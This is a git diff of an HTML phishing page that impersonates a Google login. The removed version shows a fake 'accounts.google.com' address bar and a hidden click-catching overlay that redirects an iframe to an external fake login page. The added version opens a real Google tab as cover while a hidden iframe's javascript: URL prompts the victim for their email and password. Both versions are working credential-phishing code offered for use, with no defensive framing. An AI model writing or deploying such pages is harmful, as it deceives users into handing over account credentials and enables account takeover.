@@ -1,53 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Secure Login</title>
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      font-family: sans-serif;
-    }
-    .fake-bar {
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      background: #f2f2f2;
-      padding: 8px;
-      font-size: 14px;
-      border-bottom: 1px solid #ccc;
-      z-index: 9999;
-    }
-    iframe {
-      width: 100vw;
-      height: 100vh;
-      border: none;
-      margin-top: 30px;
-    }
-    .clickcatch {
-      position: absolute;
-      top: 40%;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      z-index: 10000;
-    }
-  </style>
-</head>
-<body>
-  <div class="fake-bar">🔒 https://accounts.google.com</div>
-  <iframe id="mainFrame" src="https://www.google.com"></iframe>
+  <body>
 
-  <div class="clickcatch" onclick="triggerSpoof()"></div>
+    <script>
+      function exploit() {
+        // New tab open to make user feel like something real is happening
+        window.open("https://www.google.com");
 
-  <script>
-    function triggerSpoof() {
-      const iframe = document.getElementById("mainFrame");
-      iframe.src = "https://mrnoob790.github.io/fake-login.html"; // your fake login or phishing page
-    }
-  </script>
-</body>
+        // Prompt runs via javascript: URL inside an iframe (works in vulnerable browsers)
+        document.getElementById("phishFrame").src =
+          'javascript:prompt("To continue to Google\\nPlease login with your email and password:", "Email / Password");';
+      }
+    </script>
+
+    <a href="#" onclick="exploit();">
+      <h1>Click here to go to Google.com</h1>
+    </a>
+
+    <iframe id="phishFrame" style="width:0; height:0; border:0;"></iframe>
+
+  </body>
 </html>
